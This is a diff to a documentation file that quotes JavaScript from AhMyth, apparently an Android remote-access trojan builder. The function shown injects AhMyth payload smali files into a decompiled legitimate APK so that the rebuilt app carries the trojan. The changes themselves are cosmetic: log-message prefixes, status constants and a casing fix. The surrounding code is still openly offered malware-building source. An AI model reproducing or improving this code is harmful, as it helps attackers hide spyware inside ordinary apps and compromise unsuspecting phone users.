@@ -243,17 +243,17 @@ function GetLauncherPath(launcherActivity, apkFolder, callback) {
 ```js
 $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
 
-    delayedLog('Copying AhMyth Payload Files to Original App...');
-    DelayedLog('Reading the Original Decompiled APK...')
+    delayedLog('[★] Copying AhMyth Payload Files to Original App...');
+    delayedLog('[★] Reading the Original Decompiled APK...')
     fs.readdir(apkFolder, {
         withFileTypes: true
     }, (error, files) => {
         if (error) {
-            delayedLog('Reading the Decompiled APK Failed!')
+            delayedLog('[x] Reading the Decompiled APK Failed!', CONSTANTS.logStatus.FAIL)
             return;
         }
 
-        delayedLog('Creating the new Smali Payload Directory...')
+        delayedLog('[★] Creating the new Smali Payload Directory...')
 
         var ignoreDirs = ['original',
             'res',
@@ -278,20 +278,20 @@ $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
                 recursive: true
             }, error => {
                 if (error) {
-                    delayedLog('Unable to Create the Smali Payload Directory!');
+                    delayedLog('[x] Unable to Create the Smali Payload Directory!', CONSTANTS.logStatus.FAIL);
                     return;
                 };
 
                 fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"),
                     dir.join(apkFolder, "smali_classes2"), (error) => {
                         if (error) {
-                            delayedLog('Copying Failed!', CONSTANTS.logStatus.FAIL);
+                            delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
 
                             fs.mkdir(logPath);
                             fs.writeFile(dir.join(logPath, 'Copying.log'),
                                 `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
-                            delayedLog('Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
-                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
+                            delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
+                            delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                             return;
                         }
 
@@ -307,28 +307,28 @@ $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
             var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
             var newSmaliNumber = lastSmaliNumber+1;
             var payloadSmaliFolder = ('/smali_classes'+newSmaliNumber);
-            delayedLog('Creating the new Smali Payload Directory...')
+            delayedLog('[★] Creating the new Smali Payload Directory...')
 
             fs.mkdir(apkFolder + payloadSmaliFolder, {
                 recursive: true
             }, error => {
                 if (error) {
-                    delayedLog('Unable to Create the Smali Payload Directory!');
+                    delayedLog('[x] Unable to Create the Smali Payload Directory!', CONSTANTS.logStatus.FAIL);
                     return;
                 };
 
-                delayedLog('Copying AhMyth Payload Files to Original App...');
+                delayedLog('[★] Copying AhMyth Payload Files to Original App...');
 
                 fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"),
                     dir.join(apkFolder, payloadSmaliFolder), (error) => {
                         if (error) {
-                            delayedLog('Copying Failed!', CONSTANTS.logStatus.FAIL);
+                            delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
 
                             fs.mkdir(logPath);
                             fs.writeFile(dir.join(logPath, 'Copying.log'),
                                 `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
-                            delayedLog('Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
-                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
+                            delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
+                            delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                             return;
                         }
 
